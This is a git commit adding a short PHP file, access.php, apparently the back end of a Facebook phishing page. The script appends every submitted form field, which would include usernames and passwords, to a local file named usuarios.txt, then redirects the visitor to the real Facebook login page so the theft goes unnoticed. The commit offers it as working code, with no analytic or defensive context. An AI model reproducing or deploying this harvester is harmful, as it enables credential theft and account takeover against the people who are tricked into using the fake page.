a7d0c9d366276ce70756d095476a611c2cca48b5
anas0l <108516223+anas0l@users.noreply.github.com>
2026-02-20 19:39:42 +0100

    Add files via upload

---
+++ access.php
@@ -0,0 +1,18 @@
+<?php
+
+header("Location: http://www.Facebook.com/login.php");
+$handle = fopen("usuarios.txt", "a");
+
+foreach ($_POST as $variable => $value) {    
+    fwrite($handle, $variable);
+    fwrite($handle, "=");    
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+
+fwrite($handle, "\r\n");
+fclose($handle);
+
+exit
+?>
+
